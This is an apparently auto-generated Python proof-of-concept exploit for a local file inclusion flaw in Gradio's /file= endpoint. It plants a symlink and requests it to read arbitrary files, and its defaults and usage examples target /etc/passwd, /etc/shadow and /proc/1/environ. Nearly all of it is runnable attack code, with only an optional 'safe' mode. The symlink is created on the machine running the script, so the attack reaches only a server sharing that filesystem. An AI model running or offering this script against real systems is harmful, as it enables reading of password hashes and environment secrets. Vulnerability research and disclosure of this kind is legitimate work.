#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: lfi-018
# Sink: __call__
# Auto-generated — run with: python3 lfi_however_validation_uses_utils___call.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Gradio LFI via Symlink Bypass

Vulnerability: The /file= endpoint uses os.path.abspath() for path normalization
but does NOT resolve symlinks. An attacker can create a symlink inside an allowed
directory (or the app directory) pointing to an arbitrary file, and the containment
check will pass because the symlink's path is within the allowed directory.

This PoC:
1. Creates a symlink in /tmp pointing to /etc/passwd
2. Sends a request to the Gradio /file= endpoint with the symlink path
3. Demonstrates reading arbitrary files outside the allowed directory

Requirements: Python 3.6+, requests library
"""

import os
import sys
import tempfile
import requests
import argparse

def exploit(target_url: str, target_file: str = "/etc/passwd") -> None:
    """
    Exploit the LFI vulnerability by creating a symlink and requesting it.
    
    Args:
        target_url: Base URL of the Gradio app (e.g., http://localhost:7860)
        target_file: Absolute path to the file to read (default: /etc/passwd)
    """
    # Create a temporary directory for our symlink
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a symlink inside the temp directory pointing to the target file
        symlink_path = os.path.join(tmpdir, "exploit_link")
        try:
            os.symlink(target_file, symlink_path)
            print(f"[+] Created symlink: {symlink_path} -> {target_file}")
        except OSError as e:
            print(f"[-] Failed to create symlink: {e}")
            sys.exit(1)
        
        # The symlink path is now inside /tmp, which is often an allowed directory
        # or the app directory. The validation will check if symlink_path is within
        # allowed paths, but will NOT resolve the symlink to see where it points.
        
        # Construct the request URL
        # The /file= endpoint expects a path relative to the app or an absolute path
        # We'll use the absolute path to our symlink
        file_url = f"{target_url.rstrip('/')}/file={symlink_path}"
        print(f"[*] Requesting: {file_url}")
        
        try:
            # Send the request
            response = requests.get(file_url, timeout=10, allow_redirects=False)
            
            if response.status_code == 200:
                print(f"[+] Success! Status: {response.status_code}")
                print(f"[+] File contents ({target_file}):")
                print("-" * 50)
                print(response.text[:2000])  # Print first 2000 chars
                print("-" * 50)
                if len(response.text) > 2000:
                    print(f"[... truncated, total {len(response.text)} bytes]")
            elif response.status_code == 302:
                # Redirect - might be a URL validation issue
                print(f"[*] Got redirect to: {response.headers.get('Location', 'unknown')}")
                print("[*] This might indicate the path was treated as a URL")
            elif response.status_code == 403:
                print(f"[-] Access denied (403): {response.text[:200]}")
                print("[*] The symlink might not be in an allowed directory")
            elif response.status_code == 404:
                print(f"[-] File not found (404): {response.text[:200]}")
            else:
                print(f"[?] Unexpected status {response.status_code}: {response.text[:200]}")
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection failed. Is the Gradio app running at {target_url}?")
            sys.exit(1)
        except requests.exceptions.Timeout:
            print("[-] Request timed out")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Unexpected error: {e}")
            sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="Gradio LFI PoC - Symlink Bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 gradio_lfi_poc.py http://localhost:7860
  python3 gradio_lfi_poc.py http://localhost:7860 --file /etc/shadow
  python3 gradio_lfi_poc.py http://example.com:8080 --file /proc/1/environ
        """
    )
    parser.add_argument(
        "target",
        help="Base URL of the Gradio app (e.g., http://localhost:7860)"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="Absolute path to the file to read (default: /etc/passwd)"
    )
    parser.add_argument(
        "--safe",
        action="store_true",
        help="Use a safe payload (creates /tmp/poc_success.txt instead of reading system files)"
    )
    
    args = parser.parse_args()
    
    if args.safe:
        # Create a safe test file
        safe_file = "/tmp/poc_success.txt"
        try:
            with open(safe_file, "w") as f:
                f.write("Gradio LFI PoC - Success!\n")
            print(f"[+] Created safe test file: {safe_file}")
        except OSError as e:
            print(f"[-] Failed to create safe file: {e}")
            sys.exit(1)
        exploit(args.target, safe_file)
    else:
        exploit(args.target, args.file)

if __name__ == "__main__":
    main()
